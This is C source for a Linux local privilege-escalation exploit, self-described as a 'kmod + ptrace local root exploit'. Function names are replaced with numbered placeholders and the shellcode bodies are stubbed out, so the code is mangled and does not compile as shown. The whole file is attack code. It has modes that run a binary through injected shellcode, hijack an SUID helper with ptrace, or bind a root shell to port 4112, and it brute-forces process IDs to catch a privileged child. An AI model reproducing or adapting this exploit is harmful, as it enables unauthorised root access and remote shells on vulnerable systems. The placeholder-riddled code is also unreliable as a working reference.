#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */
struct stat {int dummy; } ;

/* Variables and functions */
 char* ANY_SUID ; 
 char EOF ; 
#define  M_BIND 130 
#define  M_DOUBLE 129 
#define  M_SIMPLE 128 
 int SIGSTOP ; 
 int SIGUSR1 ; 
 int SIGUSR2 ; 
 int /*<<< orphan*/  FUNC0 (int /*<<< orphan*/ ) ; 
 char* bin ; 
 int /*<<< orphan*/  bind_code ; 
 int chldpid ; 
 int /*<<< orphan*/  FUNC1 (char*,char**,char**) ; 
 int /*<<< orphan*/  execve_tty_code ; 
 int FUNC2 () ; 
 int /*<<< orphan*/  FUNC3 (int /*<<< orphan*/ ,char*,...) ; 
 char FUNC4 (int,char**,char*) ; 
 int FUNC5 () ; 
 int FUNC6 () ; 
 int /*<<< orphan*/  FUNC7 (int) ; 
 int hackpid ; 
 int /*<<< orphan*/  FUNC8 (int,int) ; 
 int /*<<< orphan*/  killed ; 
 struct stat me ; 
 int /*<<< orphan*/  FUNC9 (int) ; 
 int mode ; 
 char* optarg ; 
 int optind ; 
 int /*<<< orphan*/  FUNC10 (char*) ; 
 int randpids ; 
 scalar_t__ sf ; 
 int /*<<< orphan*/  shcode ; 
 int /*<<< orphan*/  FUNC11 (int,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC12 (int,int /*<<< orphan*/ ,int /*<<< orphan*/ ) ; 
 scalar_t__ FUNC13 (char*,struct stat*) ; 
 int /*<<< orphan*/  stderr ; 
 int /*<<< orphan*/  FUNC14 (int /*<<< orphan*/ ,char*) ; 
 int /*<<< orphan*/  FUNC15 (int /*<<< orphan*/ ,int /*<<< orphan*/ ) ; 
 int FUNC16 (int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  synch ; 
 scalar_t__ u2 ; 
 int /*<<< orphan*/  FUNC17 (char*) ; 
 int /*<<< orphan*/  FUNC18 (int) ; 

int FUNC19(int ac, char ** av, char ** env)
{
int single=0;
char c;
int mypid=FUNC5();
FUNC3(stderr, "Linux kmod + ptrace local root exploit by <anszom@v-lo.krakow.pl>\n\n");
	if(FUNC13("/proc/self/exe", &me) && FUNC13(av[0], &me)){
	FUNC10("stat(myself)");
	return 0;
	}

	while((c=FUNC4(ac, av, "sbdrc:"))!=EOF) switch(c) {
	case 'd': mode=M_DOUBLE; break;
	case 'b': mode=M_BIND; break;
	case 'r': randpids=1; break;
	case 'c': bin=optarg; break;
	case 's': single=1; break;
	default: FUNC17(av[0]);
	}

	if(ac!=optind) FUNC17(av[0]);

	if(!bin){
		if(mode!=M_SIMPLE) bin="/bin/sh";
		else{
		struct stat qpa;
			if(FUNC13((bin="/bin/id"), &qpa)) bin="/usr/bin/id";
		}
	}

FUNC11(SIGUSR1, synch);

hackpid=0;
	switch(mode){
	case M_SIMPLE:
	FUNC3(stderr, "=> Simple mode, executing %s > /dev/tty\n", bin);
	FUNC15(shcode, execve_tty_code);
	FUNC14(shcode, bin);
	break;

	case M_DOUBLE:
	FUNC3(stderr, "=> Double-ptrace mode, executing %s, suid-helper %s\n",
			bin, ANY_SUID);
		if((hackpid=FUNC2())==0){
		char *ble[]={ANY_SUID, NULL};
		FUNC3(stderr, "Starting suid program %s\n", ANY_SUID);
		FUNC8(FUNC6(), SIGUSR1);
		FUNC1(ble[0], ble, env);
		FUNC8(FUNC6(), 9);
		FUNC10("execve(SUID)");
		FUNC0(0);
		}

		while(!sf);

	FUNC18(100000);
	FUNC8(hackpid, SIGSTOP);
	FUNC9(hackpid);
	break;

	case M_BIND:
	FUNC3(stderr, "=> portbind mode, executing %s on port 4112\n", bin);

	FUNC15(shcode, bind_code);
	FUNC14(shcode, bin);
	break;	
	}
FUNC3(stderr, "sizeof(shellcode)=%d\n", FUNC16(shcode));
	
FUNC11(SIGUSR2, killed);

	if(randpids){
	FUNC3(stderr, "\033[1;31m"
"Randomized pids support enabled... be patient or load the system heavily,\n"
"this method does more brute-forcing\033[0m\n");
	}

again:
sf=0;
	if((chldpid=FUNC2())==0){
	int q;
	FUNC8(FUNC6(), SIGUSR1);
		while(!sf);

	FUNC3(stderr, "=> Child process started");
		for(q=0;q<10;++q){
		FUNC3(stderr, ".");
		FUNC12(22,0,0);
		}
	FUNC3(stderr, "\n");
	FUNC8(FUNC6(), SIGUSR2);
	FUNC0(0);
	}

	while(!sf);
FUNC8(chldpid, SIGUSR1);

	for(;;){
	int q;
		if(randpids){
			for(q=1;q<30000;++q)
			if(q!=chldpid && q!=mypid && q!=hackpid) FUNC7(q);
		}else{
			for(q=chldpid+1;q<chldpid+10;q++) FUNC7(q);
		}

		if(u2){
		u2=0;
			if(single) break;
		goto again;
		}
	}
FUNC3(stderr, "Failed\n");
return 1;
}